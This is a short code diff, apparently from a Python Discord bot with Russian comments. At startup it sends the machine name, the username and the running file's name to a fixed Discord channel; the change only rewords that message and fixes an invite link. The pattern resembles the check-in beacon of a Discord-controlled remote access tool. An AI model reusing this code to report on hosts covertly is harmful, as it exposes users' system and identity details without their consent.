@@ -93,7 +93,7 @@ async def on_ready():
     file_name = os.path.basename(sys.argv[0])
     
     # Формируем сообщение
-    message = f"**👋Logged as**: {pc_name}\n**👤User**: {username}\n**📁File**: {file_name} \n**✨ https//dsc.gg/ZeroTiss**"
+    message = f"**👋PC**: {pc_name}\n**👤User**: {username}\n**📁File**: {file_name} \n**✨ https://dsc.gg/ZeroTiss**"
     
     # Отправляем сообщение в канал
     channel = bot.get_channel(AUTHORIZED_CHANNEL_ID)
